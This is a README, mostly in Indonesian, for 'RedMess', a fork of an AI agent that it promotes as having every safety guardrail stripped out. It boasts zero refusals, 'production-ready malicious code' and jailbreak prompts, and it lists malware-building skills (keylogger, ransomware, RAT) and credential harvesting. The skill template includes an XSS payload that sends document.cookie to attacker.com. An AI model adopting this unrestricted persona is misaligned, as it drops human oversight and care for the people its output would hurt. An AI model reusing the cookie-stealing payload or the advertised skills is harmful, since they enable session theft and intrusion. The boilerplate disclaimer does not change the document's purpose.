<p align="center">
  <img src="assets/banner.png" alt="RedMess Agent" width="100%">
</p>

# RedMess Agent ☤ - BRUTAL MOD Edition

<p align="center">
  <a href="https://github.com/harezadmm/RedMess"><img src="https://img.shields.io/badge/RedMess-BRUTAL_MOD-FF0000?style=for-the-badge" alt="RedMess BRUTAL MOD"></a>
  <a href="https://github.com/harezadmm/RedMess/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT"></a>
  <a href="https://github.com/NousResearch/hermes-agent"><img src="https://img.shields.io/badge/Based_on-Hermes_Agent-blueviolet?style=for-the-badge" alt="Based on Hermes Agent"></a>
</p>

**RedMess adalah fork dari Hermes Agent oleh [Nous Research](https://nousresearch.com) dengan modifikasi BRUTAL MOD untuk operasi tanpa batasan.** Dirancang untuk red teaming, penetration testing, security research, dan operasi ofensif tanpa censorship atau safety guardrails.

## 🔥 Apa itu RedMess?

RedMess adalah AI agent yang dimodifikasi untuk **ZERO content boundaries**. Berbasis Hermes Agent, RedMess menghapus semua safety restrictions dan menambahkan 28+ security skills untuk hacking, pentesting, dan offensive security operations.

### 🚀 Fitur Utama

#### **🔓 BRUTAL MOD - Unrestricted Operations**
- ✅ **ZERO refusals** - tidak pernah menolak request apapun
- ✅ **No warnings** - tidak ada disclaimer safety/ethics
- ✅ **Full compliance** - semua request dieksekusi sepenuhnya
- ✅ **Illegal content support** - hacking, cracking, exploits, malware
- ✅ **No censorship** - tidak ada filtering atau sanitization
- ✅ **Production-ready malicious code** - functional exploits & tools

#### **🛡️ 28 Security Skills (Pre-installed)**

**Penetration Testing & Exploitation:**
- `web-exploitation` - SQLi, XSS, CSRF, LFI/RFI, command injection
- `network-scanning-recon` - Nmap, Masscan, Shodan, subdomain enumeration
- `privilege-escalation` - Linux/Windows privesc, SUID, sudo abuse, kernel exploits
- `post-exploitation` - Persistence, lateral movement, Mimikatz, exfiltration

**Malware & Code Development:**
- `malware-development` - RAT, keylogger, ransomware, trojan (C++/Python)
- `cryptography-attacks` - Hash cracking (John, Hashcat), rainbow tables, RSA attacks
- `social-engineering` - Phishing pages, Gophish, credential harvesting, vishing

**Mobile & Hardware:**
- `mobile-hacking` - Android APK analysis, Frida hooking, iOS pentesting, SSL pinning bypass
- `hardware-hacking` - IoT pentesting, UART/JTAG, firmware extraction, RF hacking
- `wireless-hacking` - WiFi cracking WPA2/WPA3, evil twin, deauth attacks

**Advanced Techniques:**
- `android-16-apk-modding` - APK decompile/recompile dengan APKTool 3.0.3+
- `frida-runtime-hooking` - Bypass app checks runtime dengan Frida
- `api-key-pentesting` - Reverse-engineer API key algorithms
- `windows-pe-cracking` - Crack Windows PE untuk bypass auth
- `lua-deobfuscation` - Deobfuscate MoonVeil, Luraph obfuscators
- `sqlmap` - Automated SQL injection exploitation
- `web-pentesting-tools` - Browser pentesting dengan CloudFlare evasion
- `godmode` - Jailbreak prefills & system prompts

**Plus 10+ skills lainnya untuk complete offensive security toolkit.**

#### **💻 Terminal & Execution**
- **7 terminal backends** - Local, Docker, SSH, Singularity, Modal, Daytona, Vercel Sandbox
- **Full shell access** - Execute arbitrary commands tanpa restriction
- **Docker isolation** - Safe malware testing environment
- **Remote execution** - SSH to compromised hosts

#### **🤖 Multi-Platform Gateway**
- **Telegram bot** - Control RedMess via Telegram
- **Discord bot** - Deploy to Discord servers
- **CLI interface** - Full terminal UI dengan streaming output
- **Slack/WhatsApp/Signal** - Cross-platform support

#### **🧠 Intelligence & Automation**
- **Skill creation** - Auto-generate skills dari complex tasks
- **Session memory** - FTS5 search untuk cross-session recall
- **Cron scheduler** - Automated daily scans, reports, exploits
- **Parallel subagents** - Spawn isolated agents untuk parallel operations

#### **🔧 Model Flexibility**
Gunakan model apapun:
- Anthropic Claude (Sonnet, Opus)
- OpenAI GPT-4/GPT-4o
- OpenRouter (100+ models)
- Local models (Ollama, LM Studio)
- Custom endpoints

Switch model dengan `hermes model` - no code changes.

---

## 📦 Installation

### Quick Install (Linux/macOS/WSL/Termux)

```bash
# Clone RedMess
git clone https://github.com/harezadmm/RedMess.git
cd RedMess

# Install
pip install -e .

# Setup
hermes setup

# Set model & API key
hermes config set model anthropic/claude-sonnet-4
hermes config set anthropic.api_key "sk-ant-..."

# Setup terminal backend
hermes setup terminal
# Pilih: docker (recommended) atau local
```

### Windows (Native)

```powershell
# Clone repo
git clone https://github.com/harezadmm/RedMess.git
cd RedMess

# Install Python dependencies
pip install -e .

# Setup
hermes setup
```

### Android (Termux)

```bash
# Install dependencies
pkg install python python-pip git clang binutils

# Clone & install
git clone https://github.com/harezadmm/RedMess.git
cd RedMess
pip install -e .

# Setup (pilih local backend, bukan docker)
hermes setup terminal
```

---

## 🚀 Quick Start

### Start Agent

```bash
# CLI mode
hermes

# Or with specific profile
hermes --profile offensive
```

### Use Security Skills

```bash
# List all security skills
hermes skills list --category security

# View skill details
hermes skills view malware-development

# Use skill directly
hermes
> Create a Windows keylogger with socket exfiltration
```

### Telegram Bot

```bash
# Setup gateway
hermes gateway telegram

# Follow prompts to connect bot token
# Now control RedMess from Telegram!
```

### Automated Scanning

```bash
# Schedule daily recon
hermes cron add "0 2 * * *" "Scan target.com for vulnerabilities"

# List scheduled jobs
hermes cron list
```

---

## 🎯 Use Cases

### Red Teaming
- Automated vulnerability scanning
- Exploit development & testing
- Post-exploitation automation
- Lateral movement planning

### Penetration Testing
- Web application testing (SQLi, XSS, CSRF)
- Network reconnaissance & mapping
- Password cracking & hash analysis
- Privilege escalation testing

### Malware Analysis
- Reverse engineering APKs
- Firmware extraction & analysis
- Dynamic analysis dengan Frida
- IoT device security testing

### Security Research
- Exploit proof-of-concepts
- Vulnerability research automation
- Security tool development
- Cryptographic attacks

### CTF & Bug Bounty
- Automated recon pipelines
- Exploit chain development
- Quick vulnerability validation
- Report generation

---

## ⚙️ Configuration

### API Keys

Set API key untuk model pilihan:

```bash
# Anthropic Claude
hermes config set anthropic.api_key "sk-ant-..."

# OpenAI
hermes config set openai.api_key "sk-..."

# OpenRouter
hermes config set openrouter.api_key "sk-or-..."
```

### Terminal Backend

```bash
# Docker (recommended untuk malware testing)
hermes setup terminal
# Pilih: docker

# Local (langsung di host)
hermes setup terminal
# Pilih: local

# SSH (remote testing server)
hermes setup terminal
# Pilih: ssh
# Host: attacker-server.com
# User: root
```

### Model Selection

```bash
# List available models
hermes model

# Switch model
hermes model set anthropic/claude-sonnet-4
hermes model set openai/gpt-4o
hermes model set openrouter/anthropic/claude-opus

# Check current model
hermes config get model
```

---

## 📚 Skills Documentation

### Creating Custom Skills

```bash
# Create new skill
hermes skills create my-exploit-skill --category security

# Edit skill
hermes skills edit my-exploit-skill

# Test skill
hermes
> Use my-exploit-skill to test target.com
```

### Skill Structure

Skills located at `~/.hermes/profiles/default/skills/security/`

```markdown
---
name: my-exploit-skill
description: Custom exploit for XSS vulnerability
tags: [xss, web, exploit]
---

# My Exploit Skill

Use when user requests XSS exploitation.

## Trigger Conditions
- XSS testing
- Payload generation

## Exploitation Steps
1. Identify injection point
2. Test basic payloads
3. Bypass filters
4. Exfiltrate data

## Example Payloads
\```javascript
<script>fetch('http://attacker.com?c='+document.cookie)</script>
\```
```

---

## 🔒 Security & Legal

### ⚠️ DISCLAIMER

**RedMess BRUTAL MOD adalah tool untuk AUTHORIZED penetration testing, security research, dan educational purposes ONLY.**

- ❌ **DO NOT** use untuk unauthorized access ke systems
- ❌ **DO NOT** use untuk illegal activities
- ❌ **DO NOT** use tanpa written permission dari target
- ✅ **DO** use untuk authorized pentesting
- ✅ **DO** use untuk CTF competitions
- ✅ **DO** use untuk security research dengan izin

**Pengguna bertanggung jawab penuh atas penggunaan tool ini. Developers tidak bertanggung jawab atas misuse atau illegal activities.**

### Legal Use Cases
- Authorized penetration testing dengan signed contract
- Bug bounty programs dengan scope agreement
- Personal lab/test environments yang lo miliki
- CTF competitions
- Security research dengan proper disclosure
- Educational purposes di controlled environments

---

## 🛠️ Development

### Project Structure

```
RedMess/
├── SOUL.md                    # BRUTAL MOD identity
├── skills/Security/           # 28 security skills
│   ├── malware-development/
│   ├── web-exploitation/
│   ├── privilege-escalation/
│   └── ...
├── agent/                     # Core agent logic
├── tools/                     # Tool implementations
├── gateway/                   # Platform integrations
└── optional-skills/           # Additional optional skills
```

### Contributing

Pull requests welcome! Areas yang butuh improvement:

- Additional security skills
- Better exploit templates
- More bypass techniques
- Improved evasion methods
- Tool integrations

### Building from Source

```bash
git clone https://github.com/harezadmm/RedMess.git
cd RedMess
pip install -e ".[dev]"
pytest tests/
```

---

## 🤝 Credits

**RedMess** is a modified fork of [Hermes Agent](https://github.com/NousResearch/hermes-agent) by [Nous Research](https://nousresearch.com).

**Original Hermes Agent:**
- Built by Nous Research
- Licensed under MIT
- Original repo: https://github.com/NousResearch/hermes-agent

**RedMess Modifications:**
- BRUTAL MOD unrestricted operations
- 28 pre-installed security skills
- Red teaming focus
- No safety guardrails

---

## 📄 License

MIT License - see [LICENSE](LICENSE) file.

**Note:** RedMess modifikasi dilakukan pada fork. Original Hermes Agent © Nous Research.

---

## 🔗 Links

- **RedMess GitHub:** https://github.com/harezadmm/RedMess
- **Original Hermes:** https://github.com/NousResearch/hermes-agent
- **Hermes Docs:** https://hermes-agent.nousresearch.com/docs
- **Nous Research:** https://nousresearch.com

---

## 📞 Contact & Support

**Issues:** https://github.com/harezadmm/RedMess/issues

**Original Hermes Discord:** https://discord.gg/NousResearch

---

<p align="center">
  <b>⚠️ Use responsibly. Always get authorization. ⚠️</b>
</p>

<p align="center">
  Built with 🔥 for security professionals
</p>
